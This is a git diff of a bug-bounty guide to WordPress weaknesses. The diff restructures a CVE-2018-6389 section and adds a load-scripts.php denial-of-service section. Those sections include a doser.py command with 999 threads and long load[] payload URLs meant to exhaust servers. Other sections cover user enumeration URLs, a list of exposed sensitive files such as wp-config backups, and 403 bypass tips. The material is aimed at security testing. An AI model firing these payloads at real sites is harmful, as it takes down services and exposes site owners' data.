@@ -5,11 +5,14 @@ Here I will try my best to mention all common security misconfigurations for Wor
 * Wordpress Detection
 * General Scan Tool
 * Admin Panel
-* xmlrpc.php
 * CVE-2018-6389
-* WP Cornjob DOS
+* xmlrpc.php
+* Denial of Service via Cronjob
+* Denial of Service via load-scripts.php (CVE-2018-6389)
 * WP User Enumeration
+* Sensitive files exposed
 * Bypass 403
+
 
 # Wordpress Detection
 Well, if you are reading this you already know about technology detection tool and methods.
@@ -46,6 +49,30 @@ www.example.com/wp-admin/
 ### Bypass
 * If you cant find admin panel Just go to /wp-admin/install.php and you'll find out where the login page has moved!
 * If you got 403 try methods that will explain in "Bypass 403 pages".
+
+
+# CVE-2018-6389
+This issue can down any Wordpress site under 4.9.3 So while reporting make sure that your target website is running wordpress under 4.9.3
+
+### Detection
+Use the URL from my gist called loadsxploit, you will get a massive js data in response.
+
+[loadsxploit](https://gist.github.com/remonsec/4877e9ee2b045aae96be7e2653c41df9)
+
+### Exploit
+You can use any Dos tool i found Doser really fast and it shut down the webserver within 30 second
+
+[Doser](https://github.com/quitten/doser.py)
+```
+python3 doser.py -t 999 -g 'https://site.com/fullUrlFromLoadsxploit'
+```
+### References
+[H1 Report](https://hackerone.com/reports/752010)
+
+[CVE Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389)
+
+[Blog Post](https://baraktawily.blogspot.com/2018/02/how-to-dos-29-of-world-wide-websites.html)
+
 
 # xmlrpc.php 
 This is one of the common issue on wordpress. To get some bucks with this misconfiguration you must have to exploit it fully, and have to show the impact properly as well. <br></br>
@@ -107,30 +134,8 @@ Publish a post, Edit a post , Delete a post and even possible to upload some fil
 
 [WpEngine Blog Post](https://wpengine.com/resources/xmlrpc-php/)
 
-# CVE-2018-6389
-This issue can down any Wordpress site under 4.9.3 So while reporting make sure that your target website is running wordpress under 4.9.3
 
-### Detection
-Use the URL from my gist called loadsxploit, you will get a massive js data in response.
-
-[loadsxploit](https://gist.github.com/remonsec/4877e9ee2b045aae96be7e2653c41df9)
-
-### Exploit
-You can use any Dos tool i found Doser really fast and it shut down the webserver within 30 second
-
-[Doser](https://github.com/quitten/doser.py)
-```
-python3 doser.py -t 999 -g 'https://site.com/fullUrlFromLoadsxploit'
-```
-### References
-[H1 Report](https://hackerone.com/reports/752010)
-
-[CVE Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389)
-
-[Blog Post](https://baraktawily.blogspot.com/2018/02/how-to-dos-29-of-world-wide-websites.html)
-
-
-# WP Cornjob DOS
+# Denial of Service via Cronjob
 This is another area where you can perform a DOS attack.
 
 ### Detection
@@ -148,6 +153,27 @@ python3 doser.py -t 999 -g 'https://site.com/wp-cron.php'
 
 [Medium Writeup](https://medium.com/@thecpanelguy/the-nightmare-that-is-wpcron-php-ae31c1d3ae30)
 
+# Denial of Service via load-scripts.php (CVE-2018-6389)
+In WordPress through 4.9.2 allows users to load multiple JS files and CSS files through load-scripts.php files at once. For example, https://example.com/wp-admin/load-scripts.php?c=1&load[]=jquery-ui-core,editor&ver=4.9.1, file load-scripts.php will load jquery-ui-core and editor files automatically and return the contents of the file.
+However, the number and size of files are not restricted in the process of loading JS files, attackers can use this function to deplete server resources and launch denial of service attacks.
+
+the load-scripts.php file was receiving a parameter called load[]. This parameter is an array that was receiving the names of the JS files that needed to be loaded. In this case, it was receiving jQuery UI Core, which is the name of one of the Javascript files used by the WordPress login page. (it can be longer, this is just an example)
+As no rate-limiting is setup for this URL - then DoS comes real.
+
+```
+http://example.com/wp-admin/load-scripts.php?c=1&load[]=jquery-ui-core&ver=4.9.1
+```
+### Exploit
+```
+http://example.com/wp-admin/load-scripts.php?load=react,react-dom,moment,lodash,wp-polyfill-fetch,wp-polyfill-formdata,wp-polyfill-node-contains,wp-polyfill-url,wp-polyfill-dom-rect,wp-polyfill-element-closest,wp-polyfill,wp-block-library,wp-edit-post,wp-i18n,wp-hooks,wp-api-fetch,wp-data,wp-date,editor,colorpicker,media,wplink,link,utils,common,wp-sanitize,sack,quicktags,clipboard,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-reply,json2,underscore,backbone,wp-util,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrate,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,esprima,jshint,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-bar,wplink,wpdialogs,word-count,media-upload,hoverIntent,hoverintent-js,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embed,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,site-health,privacy-tools,updates,farbtastic,iris,wp-color-picker,dashboard,list-revisions,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter
+
+Also You Can Use load-styles.php:
+http://target.com/wp-admin/load-styles.php?&load=common,forms,admin-menu,dashboard,list-tables,edit,revisions,media,themes,about,nav-menus,widgets,site-icon,l10n,install,wp-color-picker,customize-controls,customize-widgets,customize-nav-menus,customize-preview,ie,login,site-health,buttons,admin-bar,wp-auth-check,editor-buttons,media-views,wp-pointer,wp-jquery-ui-dialog,wp-block-library-theme,wp-edit-blocks,wp-block-editor,wp-block-library,wp-components,wp-edit-post,wp-editor,wp-format-library,wp-list-reusable-blocks,wp-nux,deprecated-media,farbtastic
+```
+
+### Reference
+[hackerone](https://hackerone.com/reports/694467)
+
 # WP User Enumeration
 This issue will only acceptable when target website is hiding their current users or they are not publically available. So attacker can use those user data for bruteforcing and other staff
 
@@ -157,7 +183,8 @@ This issue will only acceptable when target website is hiding their current user
     - You will see json data with user info in response
     - if you got 403 error you can use this bypass </br>
     ![wpb](https://user-images.githubusercontent.com/63053441/137262896-0d59a62d-c386-4009-af84-4266b72428b6.png)<br></br>
-
+    
+- try http://target.com/?rest_route=/wp/v2/users
 - /?author=1
     - Increment the number to get more
 - User enum with admin panel
@@ -190,6 +217,49 @@ metaWeblog.getUsersBlogs
 
 ### Reference
 [H1 Report](https://hackerone.com/reports/356047)
+
+
+# Sensitive files exposed
+This is list of files that can exposure sensitive data, so add it to your list
+```
+wp-includes
+wp-content/uploads
+wp-content/debug.log
+Wp-load
+Wp-json
+index.php
+wp-login.php
+wp-links-opml.php
+wp-activate.php
+wp-blog-header.php
+wp-cron.php
+wp-links.php
+wp-mail.php
+xmlrpc.php
+wp-settings.php
+wp-trackback.php
+wp-ajax.php
+wp-admin.php
+wp-config.php
+.wp-config.php.swp
+wp-config.inc
+wp-config.old
+wp-config.txt
+wp-config.html
+wp-config.php.bak
+wp-config.php.dist
+wp-config.php.inc
+wp-config.php.old
+wp-config.php.save
+wp-config.php.swp
+wp-config.php.txt
+wp-config.php.zip
+wp-config.php.html
+wp-config.php~
+/wp-admin/setup-config.php?step=1
+/wp-admin/install.php
+```
+
 
 # Bypass 403
 
@@ -237,11 +307,3 @@ X-Rewrite-Url: wp-login.php
 https://github.com/yunemse48/403bypasser
 https://github.com/iamj0ker/bypass-403
 
-
-# Researcher Note
-Please do not depend on those issues at all. I saw people only looking for those issues and nothing else. Those are good to have a look while testing for other vulnerabilities and most of the time they work good for chaining with other low bugs.
-
-# Author
-**Name:** Mehedi Hasan Remon
-
-**Handle:** [@remonsec](https://twitter.com/remonsec)
